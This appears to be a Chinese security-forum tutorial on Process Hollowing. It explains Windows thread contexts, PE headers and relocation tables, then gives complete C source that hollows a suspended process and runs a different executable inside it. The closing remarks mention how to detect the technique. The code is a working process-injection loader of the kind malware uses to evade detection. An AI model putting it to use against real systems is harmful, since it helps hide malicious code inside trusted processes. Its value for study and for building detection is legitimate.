0x0 前言与基础
=========

各位师傅们好，本文记录了一个小菜鸡对Process Hollowing(傀儡进程)的学习和总结，文中如有错误，麻烦大佬们指出！本文比较基础，请各位大佬们勿喷。

基础知识
----

### 线程与CONTEXT结构

在程序运行时线程是来回切换的，比如A线程执行一段时间，然后切换到B线程执行，B线程执行一段时间后在切回A线程，但是如果这样做就会出现问题，因为A线程运行时寄存器的值已经被B线程修改了。

CONTEXT结构解决了这个问题，有了CONTEXT结构，我们在进行线程切换时，就可以将A线程的各种寄存器数据放到CONTEXT结构中保存起来，这样就避免了切换线程时寄存器被修改的问题。

### Pe信息解析

**ImageBase**是程序运行时的基址，也就是程序被映射进程的4gb内存中的地址这个值不一定准确。如果ImageBase与映射到进程中的内存地址如果不一样，系统会对程序执行重定位操作。

**AddressOfEntryPoint**是程序的入口点，这个值只是一个偏移，加上**ImageBase**中的值才是真正的程序入口点。

**SizeOfImage**是程序拉伸后(转换成imagebuffer)的大小，也就是程序在进程中的大小。

### 重定位表解析

在程序中全局变量的地址是固定的，这个地址=基址(ImageBase)+偏移，如果imagebase与程序在进程中的地址一样的话就不需要做重定位，但如果不一样就需要重定位，因为如果基址不一样，在使用程序中的全局变量的时候就会出现错误。

举个例子，A程序的ImageBase是400000，程序中有一个全局变量，地址是401000，如果A程序在映射到进程的内存中占住了400000就不会出现问题，如果占不住，被分配到了500000，那么在访问401000这个地址就会出现问题，这就要用到重定位表对程序进行重定位操作。

重定位表结构体定义

```js
typedef struct _IMAGE_BASE_RELOCATION {
    DWORD   VirtualAddress;//当前块的基址
    DWORD   SizeOfBlock;//当前块的大小
//  WORD    TypeOffset[1];
} IMAGE_BASE_RELOCATION;
typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;
```

重定位表在内存中的结构

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-93e8c798b28d7102d6c9b4f7b2901d3bc25cff74.png)  
SizeOfBlock成员后面的才是真正的偏移(就是图中的那一堆二进制)。

每一个偏移占两个字节(16位)，在这16位二进制中如果前四位是3，那么代表这个偏移是有效的，否则这个数据就是为了内存对齐存在的。

我们可以通过`(SizeOfBlock-8)/2`得到偏移数据的数量，`VirtualAddress+偏移=指向需要重定位的地方的指针。`

重定位表结束的地方是一个全0的`PIMAGE_BASE_RELOCATION`结构。

### 右移指令&gt;&gt;

位运算是直接对二进制位进行操作的，右移就是将二进制位往右移动，移出去的二进制位被丢弃，左边补0。

举个栗子: 0101 &gt;&gt; 1 = 0010，0011 0101 0101 01110 &gt;&gt; 12 = 0000 0000 0000 0011。

在代码中会通过右移指令判断重定位表中的偏移数据是否有效。

### 与运算&amp;

逻辑运算指令之一，0&amp;0=0，0&amp;1=0，1&amp;1=1.  
只有都是1时才是1，否则是0。  
栗子: 0100 0100 &amp; 1011 0101 = 0000 0100

0x1 Process Hollowing原理
=======================

通过创建挂起A进程，替换A程序在进程中的映射为B程序，实现A程序执行B程序的功能。

0x2 Process Hollowing实现过程
=========================

假设我们有两个程序:A和B，我们想要让A作为傀儡来B程序的功能，那么实现过程可以分为以下几步。

1. 读取B程序到内存中
2. 为A程序创建挂起进程
3. 得到挂起进程的线程上下文
4. 卸载掉A程序在内存中的映射
5. 得到B程序的Pe信息如ImageBase等
6. 根据B程序的ImageBase在A程序的内存中申请内存
7. 将B程序拉伸转换成ImageBuffer(运行时状态)
8. 将拉伸后的B程序写入到刚刚创建的A进程的内存中
9. 修改线程上下文，并恢复挂起线程 0x3 实现代码解析
    ==========
    
    **Process Hollowing**的思路和过程上面已经说过了，我们直接来看代码  
    。
    
    ```js
    PVOID buffer=ReadFile2Memory(L"C:\\Users\\blue\\Desktop\\msgbox.txt");
    WCHAR path[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL,path,MAX_PATH);
    ```

首先定义了一个自己的函数**ReadFile2Memory**(函数实现代码会在下面贴出来)，函数功能是读取文件到内存中，参数是要读取文件的路径，返回值是文件在内存中的地址，这里使用了一个指针来接收这个地址。

第三行调用了**GetModuleFileNameW**函数，这个函数在此处的作用是得到当前程序的路径。第一个参数如果是NULL就代表要得到当前程序的路径，第二个参数是指向缓冲区的指针，这个缓冲区用来接收返回的路径，第三个参数是缓冲区的大小。

```js
STARTUPINFOW st = { 0 };
st.cb = sizeof(st);
PROCESS_INFORMATION info = { 0 };
CreateProcessW(path, NULL, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &amp;st, &amp;info);
```

第一行主要用来设置要创建进程的窗口属性，这里默认即可。

第三行定义了一个**PROCESS\_INFORMATION**类型的结构体，这个结构体用来存储新创建的进程和主线程的信息。

结构体定义

```jstypedef
struct _PROCESS_INFORMATION {
  HANDLE hProcess;//新创建进程的句柄
  HANDLE hThread;//新创建进程的主线程句柄
  DWORD  dwProcessId;//进程的id
  DWORD  dwThreadId;//线程的id
} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
```

然后调用了**CreateProcessW**函数，此函数用于创建进程，第一个参数：要创建进程的exe的路径，第二个参数：命令行的参数，可以为NULL，第三个参数和第四个参数都是安全描述符，填NULL即可，第五个参数：是否让创建的子进程继承自己的句柄，继承填TRUE，不继承FALSE，第六个参数：进程创建的标志，CREATE\_SUSPENDED代表已挂起方式创建，第七个参数：指向新进程环境块的指针，为NULL即可，第八个参数：进程当前目录完整的路径，为NULL即可，第九个参数：指向STARTUPINFOW结构的指针，第十个参数：指向PROCESS\_INFORMATION结构的指针。

上面代码大致作用：用**CreateProcessW**的函数为当前程序创建一个挂起的进程。

```js
CONTEXT context = { 0 };
context.ContextFlags = CONTEXT_FULL;
BOOL Code=GetThreadContext(info.hThread, &amp;context);
if (Code == NULL) {
    printf("GetThreadContext Error Code:%d\n", GetLastError());
    return;
}
```

首先定义了一个**CONTEXT**结构，这个结构体的成员中存储的就是线程在挂起时各个寄存器的值，ContextFlags成员代表我们要使用这个结构中的哪些寄存器。

**GetThreadContext**函数用于获得挂起进程的**CONTEXT**结构的信息，第一个参数：要获取CONTEXT结构的线程的句柄，第二个参数：一个指向CONTEXT结构的指针，函数如果失败返回FALSE。

```js
pZwUnmapViewOfSection UnmapViewOfSection = (pZwUnmapViewOfSection)GetProcAddress(LoadLibraryW(L"ntdll"), "ZwUnmapViewOfSection");
if (UnmapViewOfSection == NULL) {
    printf("GetProcAddress Error Code:%d\n", GetLastError());
    return;
}
```

**LoadLibraryW**函数功能是加载dll并得到它的句柄，**GetProcAddress**函数功能是得到指定函数的地址，第一个参数：函数所在dll的句柄，第二个参数：函数的名字。

上面代码大致作用：加载ntdll，并得到ntdll中**ZwUnmapViewOfSection**函数的地址，并用一个函数指针来接受它。

```js

HMODULE hModule = GetModuleHandleW(NULL);
PeInfo shell = { 0 };
GetPeInfo((PBYTE)hModule,&amp;shell.ImageBase,&amp;shell.Oep,&amp;shell.SizeOfImage,&amp;shell.ReCode);
UnmapViewOfSection(info.hProcess, (PVOID)shell.ImageBase);
```

**GetModuleHandleW**函数用于得到指定模块的句柄，第一个参数：模块的名字，如果第一个参数为NULL，那么此函数将的得到当前程序的句柄。

第二行定义了一个结构体，此结构体用来存储需要用到的pe信息。  
结构体定义

```js
struct PeInfo{
    DWORD ImageBase;//存储程序的ImageBase，此成员代表程序的基址
    DWORD Oep;//存储Oep(AddressOfEntryPoint)，此成员代表程序的入口点
    DWORD SizeOfImage;//存储SizeOfImage，此成员代表程序拉伸后的大小
    CHAR ReCode;//用于判断程序是否存在重定位表，存在就是1，不存在时0
};
```

**GetPeInfo**是我们自己写的函数(代码在下面)，功能是得到指定句柄的pe信息，第一个参数：要得到信息的模块的句柄，第二个参数：指向ImageBase的指针，第三个参数：指向Oep的指针，第四个参数：指向SizeOfImage的指针，第五个参数：指向ReCode的指针。

在得到所需的pe信息后，调用**ZwUnmapViewOfSection**函数卸载掉映射到挂起进程中的程序

```js
PeInfo src = { 0 };
GetPeInfo((PBYTE)buffer, &amp;src.ImageBase, &amp;src.Oep, &amp;src.SizeOfImage,&amp;src.ReCode);//得到源程序的pe信息
PVOID imagebuffer=VirtualAllocEx(info.hProcess, (PVOID)src.ImageBase, src.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//申请源程序所需的空间
```

第二行得到的是B进程的pe信息，在得到我们需要的pe信息后使用**VirtualAllocEx**函数在A进程的空间中申请内存，第一个参数：申请内存的进程句柄，第二个参数：要在哪里申请内存，一个指针，第三个参数：要申请多大的内存，第四个参数：申请内存的类型，这里是保留和提交，第五个参数：申请内存的属性，如果函数执行失败返回值为NULL.

```js
if (imagebuffer != NULL) {//不等与空代表内存申请成功
        PVOID Imagebuffer = F2i((PBYTE)buffer);
        WriteProcessMemory(info.hProcess, imagebuffer, Imagebuffer, src.SizeOfImage, NULL);
        WriteProcessMemory(info.hProcess, (LPVOID)(context.Ebx + 8), &amp;imagebuffer, 4, NULL);
        context.Eax = src.Oep + (DWORD)imagebuffer;
        context.ContextFlags = CONTEXT_FULL;
        SetThreadContext(info.hThread, &amp;context);
        ResumeThread(info.hThread);
 }
```

首先是一个if来判断申请内存是否成功，调用**F2i**函数将B程序拉伸，也就是从filebuffer状态转换成imagebuffer状态。

然后调用**WriteProcessMemory**此函数功能：往别的进程中的内存写入数据，第一个参数是：写入的进程句柄，第二个参数：要写到哪里，第三个参数：写入数据的来源，第四个参数：写入数据的大小，第五个参数：代表写入了多少字节，如果是NULL，则代表忽略此参数。

第一个**WriteProcessMemory**函数是将拉伸后的B程序写入到A进程中，第二个**WriteProcessMemory**是将B程序的基址(ImageBase)覆盖掉A程序的ImageBase。

然后将context结构中Eax寄存器的值改为程序真正的入口点，也就是`src.Oep + (DWORD)imagebuffer;`，然后调用**SetThreadContext**函数设置线程的**CONTEXT**结构，此函数第一个参数：要设置**CONTEXT**结构的线程的句柄，第二个参数：指向**CONTEXT**结构的指针。

最后使用**ResumeThread**函数恢复了线程的运行，下面我们来看下内存申请失败的代码。

如果内存申请失败就执行else的代码。

```js
else {//不相等代表在指定位置申请内存失败，需要系统指定位置申请
    if (src.ReCode == 0x1) {//重定位表存在
        printf("Relocation table Exist Start Relocation\n");
        PVOID n_buffer = VirtualAllocEx(info.hProcess, NULL, src.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (n_buffer == NULL) {
            printf("VirtualAllocEx Error Code:%d\n", GetLastError());
            return;
        }
        PatchRe((DWORD)n_buffer, (PBYTE)buffer);
        PVOID Imagebuffer = F2i((PBYTE)buffer);
        WriteProcessMemory(info.hProcess, n_buffer, Imagebuffer, src.SizeOfImage, NULL);
        WriteProcessMemory(info.hProcess, (LPVOID)(context.Ebx + 8), &n_buffer, 4, NULL);
        context.Eax = src.Oep + (DWORD)n_buffer;
        context.ContextFlags = CONTEXT_FULL;
        SetThreadContext(info.hThread, &context);
        ResumeThread(info.hThread);
    }

}
```

首先通过if语句来判断ReCode的值来确认重定位表存不存在，如果存在就继续执行。

接着调用了**VirtualAllocEx**函数申请内存，但这次第二个参数填了NULL，代表由系统决定在哪里申请内存，其余的参数由于上面已经说过了就不再赘述了。

成功申请内存后调用了**PatchRe**函数，这个函数功能是修复重定位表，在下面会给出函数的实现和代码解析。

执行完**PatchRe**函数，又调用了**F2i**函数，将B程序由filebuffer状态转换程imagebuffer状态。

接着又调用**WriteProcessMemory**将imagebuffer状态下的B程序数据写入到之前创建的挂起进程中，然后调用了**WriteProcessMemory**函数覆盖A进程的**ImageBase**  
最后这几行主要做了设置程序入口点，设置线程的CONTEXT结构，并恢复线程执行。

ReadFile2Memory函数实现
-------------------

```js
PVOID ReadFile2Memory(LPCWSTR path) {

    DWORD ReadByte = 0;
    HANDLE hFile = CreateFileW(path, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFileW Error Code:%d\n",GetLastError());
        return 0;
    }
    DWORD Size = GetFileSize(hFile, NULL);
    PVOID buffer = VirtualAlloc(NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (buffer == NULL) {
        printf("VirtualAlloc Error Code:%d\n", GetLastError());
        return 0;
    }
    BOOL Code=ReadFile(hFile,buffer,Size,&ReadByte,NULL);
    if (Code == NULL) {
        printf("ReadFile Error Code:%d\n", GetLastError());
        return 0;
    }
    return buffer;
}
```

大概就是通过**CreateFileW**函数得到文件的句柄，然后调用**ReadFile**函数读取文件到内存中，因为这个不是重点就不详细介绍了。

GetPeInfo函数实现
-------------

```js
DWORD GetPeInfo(PBYTE buffer,PDWORD Imagebase, PDWORD Oep,PDWORD SizeOfImage,PCHAR ReCode) {
    PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS Nt = (PIMAGE_NT_HEADERS)(buffer + Dos->e_lfanew);
    PIMAGE_OPTIONAL_HEADER32 Option = (PIMAGE_OPTIONAL_HEADER32)(buffer + Dos->e_lfanew + 24);
    PIMAGE_SECTION_HEADER Sec = IMAGE_FIRST_SECTION(Nt);
    PIMAGE_DATA_DIRECTORY Data = (PIMAGE_DATA_DIRECTORY)((PBYTE)Sec - 128);
    *Imagebase =Option->ImageBase;
    *Oep = Option->AddressOfEntryPoint;
    *SizeOfImage = Option->SizeOfImage;
    if (Data[5].VirtualAddress == NULL && Data[5].Size == NULL) {
        MessageBox(0, L"重定位表为空", 0, 0);
        *ReCode = 0x0;
                return 0;
    }
    *ReCode = 0x1;
    return 0;
}
```

代码大概作用是得到传入句柄的pe信息，然后通过指针传出去。

**PIMAGE\_DATA\_DIRECTORY**是数据目录表结构体指针，数据目录表的第六项就是重定位表的数据，因为数据目录表是从0开始的所以这里就是5，通过重定位表的VirtualAddress和Size为不为空，来判断存不存在重定位表。

PatchRe函数实现
-----------

```js
DWORD PatchRe(DWORD newImageBase, PBYTE ptr) {
    PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)ptr;//定位Dos头
    PIMAGE_NT_HEADERS Nt = (PIMAGE_NT_HEADERS)(ptr + Dos->e_lfanew);//定位Nt头
    PIMAGE_FILE_HEADER File = (PIMAGE_FILE_HEADER)(ptr + Dos->e_lfanew + 4);//定位File头
    PIMAGE_OPTIONAL_HEADER Option = (PIMAGE_OPTIONAL_HEADER)(ptr + Dos->e_lfanew + 24);//定位Option头
    PIMAGE_SECTION_HEADER Sec = IMAGE_FIRST_SECTION(Nt);//定位节表
    PIMAGE_DATA_DIRECTORY Data = (PIMAGE_DATA_DIRECTORY)((PBYTE)Sec - 128);//定位数据目录
    PIMAGE_BASE_RELOCATION Relocation = (PIMAGE_BASE_RELOCATION)(ptr + rtf((char*)ptr, Data[5].VirtualAddress));//定位重定位表
    DWORD nImageBase = newImageBase - Option->ImageBase;
    Option->ImageBase = newImageBase;

    for (; Relocation->VirtualAddress && Relocation->SizeOfBlock;)
    {

        DWORD RecCount = (Relocation->SizeOfBlock - 8) / 2;
        PWORD RecAdd = (PWORD)((PBYTE)Relocation + 8);
        for (DWORD j = 0; j < RecCount; j++)
        {
            if (RecAdd[j] >> 12 == 3)
            {

                DWORD RecAdd2 = RecAdd[j] & 0x0fff;//0x0fff=0x0000 1111 1111 1111
                DWORD RecAdd3 = rtf((char*)ptr, RecAdd2 + Relocation->VirtualAddress);
                PDWORD RecAdd4 = (PDWORD)(RecAdd3 + ptr);
                *RecAdd4 = *RecAdd4 + nImageBase;
            }
            continue;
        }
        Relocation = (PIMAGE_BASE_RELOCATION)((char*)Relocation + Relocation->SizeOfBlock);
    }

    return 1;
}
```

定位各种头的就不说了，直接看比较重要的代码

```js
DWORD nImageBase = newImageBase - Option->ImageBase;
Option->ImageBase = newImageBase;
```

第一行通过新的imagebase-旧的imagebase得到它们之间的偏移，第二行修改程序的基址为新的imagebase

```js
for (; Relocation->VirtualAddress && Relocation->SizeOfBlock;)
    {

        DWORD RecCount = (Relocation->SizeOfBlock - 8) / 2;
        PWORD RecAdd = (PWORD)((PBYTE)Relocation + 8);
        for (DWORD j = 0; j < RecCount; j++)
        {
            if (RecAdd[j] >> 12 == 3)
            {

                DWORD RecAdd2 = RecAdd[j] & 0x0fff;//0x0fff=0x0000 1111 1111 1111
                DWORD RecAdd3 = rtf((char*)ptr, RecAdd2 + Relocation->VirtualAddress);
                PDWORD RecAdd4 = (PDWORD)(RecAdd3 + ptr);
                *RecAdd4 = *RecAdd4 + nImageBase;
            }
            continue;
        }
        Relocation = (PIMAGE_BASE_RELOCATION)((char*)Relocation + Relocation->SizeOfBlock);
    }
```

上面说过重定位表**VirtualAddress**和**SizeOfBlock**如果为0就代表重定位表结束，因此这里使用for循环来判断重定位表结不结束，如果**VirtualAddress**和**SizeOfBlock**不为0，将会一直循环。

然后通过`(Relocation->SizeOfBlock - 8) / 2`得到偏移数据的数量。

因为重定位表大小是8字节，所以通过`(PWORD)((PBYTE)Relocation + 8)`来定位偏移数据。

`for (DWORD j = 0; j < RecCount; j++) {}`  
然后又嵌套了一个循环，这个循环用来遍历偏移数据。

`if (RecAdd[j] >> 12 == 3)`  
上面说过偏移数据的前4位如果是3代表这个偏移是有效的，这里使用右移指令让偏移数据右移12位。得到前四位的值然后与3比较。

`DWORD RecAdd2 = RecAdd[j] & 0x0fff`将偏移数据和0x0fff进行与运算，因为偏移数据前四位的值只是用来判断这个偏移是否有效的，不能让前四位也参与运算需要丢掉它。

```js
DWORD RecAdd3 = rtf((char*)ptr, RecAdd2 + Relocation->VirtualAddress);
```

将偏移数据与重定位表的基址相加得到需要修改地址的rva(imagebuffer下的偏移)，然后通过rtf函数将rva转换成foa(filebuffer状态下的偏移)，函数的返回值是rva对应的foa，得到foa后又把它赋值给了RecAdd3。

```js
PDWORD RecAdd4 = (PDWORD)(RecAdd3 + ptr);
*RecAdd4 = *RecAdd4 + nImageBase;
```

第一行通过偏移+基址得到真正需要修改的地方的指针，第二行就是给需要修改的地方赋值，nImageBase是新ImageBase与旧ImageBase的差。

0x4 完整代码
========

main.cpp

```js
#include "Func.h"

void main() {
    PVOID buffer=ReadFile2Memory(L"C:\\Users\\ak\\Desktop\\msgbox.txt");
    WCHAR path[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL,path,MAX_PATH);
    STARTUPINFOW st = { 0 };
    st.cb = sizeof(st);
    PROCESS_INFORMATION info = { 0 };
    CreateProcessW(path, NULL, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &st, &info);
    CONTEXT context = { 0 };
    context.ContextFlags = CONTEXT_FULL;
    BOOL Code=GetThreadContext(info.hThread, &context);
    if (Code == NULL) {
        printf("GetThreadContext Error Code:%d\n", GetLastError());
        return;
    }
    pZwUnmapViewOfSection UnmapViewOfSection = (pZwUnmapViewOfSection)GetProcAddress(LoadLibraryW(L"ntdll"), "ZwUnmapViewOfSection");
    if (UnmapViewOfSection == NULL) {
        printf("GetProcAddress Error Code:%d\n", GetLastError());
        return;
    }
    HMODULE hModule = GetModuleHandleW(NULL);
    PeInfo shell = { 0 };
    GetPeInfo((PBYTE)hModule,&shell.ImageBase,&shell.Oep,&shell.SizeOfImage,&shell.ReCode);
    UnmapViewOfSection(info.hProcess, (PVOID)shell.ImageBase);
    PeInfo src = { 0 };
    GetPeInfo((PBYTE)buffer, &src.ImageBase, &src.Oep, &src.SizeOfImage,&src.ReCode);//得到源程序的pe信息
    PVOID imagebuffer=VirtualAllocEx(info.hProcess, (PVOID)src.ImageBase, src.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//申请源程序所需的空间
    if (imagebuffer != NULL) {//不等空代表内存申请成功
        printf("Not Relocation\n");
        PVOID Imagebuffer = F2i((PBYTE)buffer);
        WriteProcessMemory(info.hProcess, imagebuffer, Imagebuffer, src.SizeOfImage, NULL);
        WriteProcessMemory(info.hProcess, (LPVOID)(context.Ebx + 8), &imagebuffer, 4, NULL);
        context.Eax = src.Oep + (DWORD)imagebuffer;
        context.ContextFlags = CONTEXT_FULL;
        SetThreadContext(info.hThread, &context);
        ResumeThread(info.hThread);
    }
    else {//不相等代表在指定位置申请内存失败，需要系统指定位置申请
        if (src.ReCode == 0x1) {//重定位表存在
            printf("Relocation table Exist Start Relocation\n");
            PVOID n_buffer = VirtualAllocEx(info.hProcess, NULL, src.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (n_buffer == NULL) {
                printf("VirtualAllocEx Error Code:%d\n", GetLastError());
                return;
            }
            PatchRe((DWORD)n_buffer, (PBYTE)buffer);
            PVOID Imagebuffer = F2i((PBYTE)buffer);
            WriteProcessMemory(info.hProcess, n_buffer, Imagebuffer, src.SizeOfImage, NULL);
            WriteProcessMemory(info.hProcess, (LPVOID)(context.Ebx + 8), &n_buffer, 4, NULL);
            context.Eax = src.Oep + (DWORD)n_buffer;
            context.ContextFlags = CONTEXT_FULL;
            SetThreadContext(info.hThread, &context);
            ResumeThread(info.hThread);
        }

    }

}
```

func.h

```js
#pragma once
#include <stdio.h>
#include <Windows.h>

typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
struct PeInfo{
    DWORD ImageBase;
    DWORD Oep;
    DWORD SizeOfImage;
    CHAR ReCode;
};

DWORD rtf(char* buffer, DWORD rva)
{
    PIMAGE_DOS_HEADER doshd = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS nthd = (PIMAGE_NT_HEADERS)(buffer + doshd->e_lfanew);
    PIMAGE_FILE_HEADER filehd = (PIMAGE_FILE_HEADER)(buffer + doshd->e_lfanew + 4);
    PIMAGE_OPTIONAL_HEADER32 optionhd = (PIMAGE_OPTIONAL_HEADER32)(buffer + doshd->e_lfanew + 24);
    PIMAGE_SECTION_HEADER sectionhd = IMAGE_FIRST_SECTION(nthd);
    //IMAGE_FIRST_SECTION
    if (rva < optionhd->SizeOfHeaders)
    {
        return rva;
    }
    for (int i = 0; i < filehd->NumberOfSections; i++)
    {
        if (rva >= sectionhd[i].VirtualAddress && rva <= sectionhd[i].VirtualAddress + sectionhd[i].SizeOfRawData)
        {
            return rva - sectionhd[i].VirtualAddress + sectionhd[i].PointerToRawData;
        }
    }
    return 0;
}
PVOID ReadFile2Memory(LPCWSTR path) {

    DWORD ReadByte = 0;
    HANDLE hFile = CreateFileW(path, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFileW Error Code:%d\n",GetLastError());
        return 0;
    }
    DWORD Size = GetFileSize(hFile, NULL);
    PVOID buffer = VirtualAlloc(NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (buffer == NULL) {
        printf("VirtualAlloc Error Code:%d\n", GetLastError());
        return 0;
    }
    BOOL Code=ReadFile(hFile,buffer,Size,&ReadByte,NULL);
    if (Code == NULL) {
        printf("ReadFile Error Code:%d\n", GetLastError());
        return 0;
    }
    return buffer;
}
DWORD GetPeInfo(PBYTE buffer,PDWORD Imagebase, PDWORD Oep,PDWORD SizeOfImage,PCHAR ReCode) {
    PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS Nt = (PIMAGE_NT_HEADERS)(buffer + Dos->e_lfanew);
    PIMAGE_OPTIONAL_HEADER32 Option = (PIMAGE_OPTIONAL_HEADER32)(buffer + Dos->e_lfanew + 24);
    PIMAGE_SECTION_HEADER Sec = IMAGE_FIRST_SECTION(Nt);
    PIMAGE_DATA_DIRECTORY Data = (PIMAGE_DATA_DIRECTORY)((PBYTE)Sec - 128);
    *Imagebase =Option->ImageBase;
    *Oep = Option->AddressOfEntryPoint;
    *SizeOfImage = Option->SizeOfImage;
    if (Data[5].VirtualAddress == NULL && Data[5].Size == NULL) {
        MessageBox(0, L"重定位表为空", 0, 0);
        *ReCode = 0x0;
    }
    *ReCode = 0x1;
    return 0;
}
PVOID F2i(PBYTE filebuffer) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)filebuffer;
    PIMAGE_NT_HEADERS nt = nt = (PIMAGE_NT_HEADERS)(filebuffer + dos->e_lfanew);
    PIMAGE_FILE_HEADER file_header = (PIMAGE_FILE_HEADER)(filebuffer + dos->e_lfanew + 4);
    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt);
    PIMAGE_OPTIONAL_HEADER32 option_header = (PIMAGE_OPTIONAL_HEADER32)(filebuffer + dos->e_lfanew + 24);
    PBYTE buffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, option_header->SizeOfImage);
    memcpy(buffer, dos, option_header->SizeOfHeaders);//复制头
    for (int i = 0; i < file_header->NumberOfSections; i++) {

        memcpy((LPVOID)((DWORD)buffer + section_header[i].VirtualAddress), (LPVOID)((DWORD)filebuffer + section_header[i].PointerToRawData), section_header[i].SizeOfRawData);
    };

    return buffer;

}
DWORD PatchRe(DWORD newImageBase, PBYTE ptr) {
    PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)ptr;
    PIMAGE_NT_HEADERS Nt = (PIMAGE_NT_HEADERS)(ptr + Dos->e_lfanew);
    PIMAGE_FILE_HEADER File = (PIMAGE_FILE_HEADER)(ptr + Dos->e_lfanew + 4);
    PIMAGE_OPTIONAL_HEADER Option = (PIMAGE_OPTIONAL_HEADER)(ptr + Dos->e_lfanew + 24);
    PIMAGE_SECTION_HEADER Sec = IMAGE_FIRST_SECTION(Nt);
    PIMAGE_DATA_DIRECTORY Data = (PIMAGE_DATA_DIRECTORY)((PBYTE)Sec - 128);
    PIMAGE_BASE_RELOCATION Relocation = (PIMAGE_BASE_RELOCATION)(ptr + rtf((char*)ptr, Data[5].VirtualAddress));
    DWORD nImageBase = newImageBase - Option->ImageBase;
    Option->ImageBase = newImageBase;

    for (; Relocation->VirtualAddress && Relocation->SizeOfBlock;)
    {

        DWORD RecCount = (Relocation->SizeOfBlock - 8) / 2;
        PWORD RecAdd = (PWORD)((PBYTE)Relocation + 8);
        for (DWORD j = 0; j < RecCount; j++)
        {
            if (RecAdd[j] >> 12 == 3)
            {

                DWORD RecAdd2 = RecAdd[j] & 0x0fff;//0x0fff=0x0000 1111 1111 1111
                DWORD RecAdd3 = rtf((char*)ptr, RecAdd2 + Relocation->VirtualAddress);
                PDWORD RecAdd4 = (PDWORD)(RecAdd3 + ptr);
                *RecAdd4 = *RecAdd4 + nImageBase;
            }
            continue;
        }
        Relocation = (PIMAGE_BASE_RELOCATION)((char*)Relocation + Relocation->SizeOfBlock);
    }

    return 1;
}

```

0x5 总结
======

Process Hollowing是进程注入技术的一种，主要是对映射到进程中的程序数据做了替换，相当于狸猫换太子，可以通过监控**ZwUnmapViewOfSection**函数的调用来检测Process Hollowing。

最后祝各位审核，师傅春节快乐。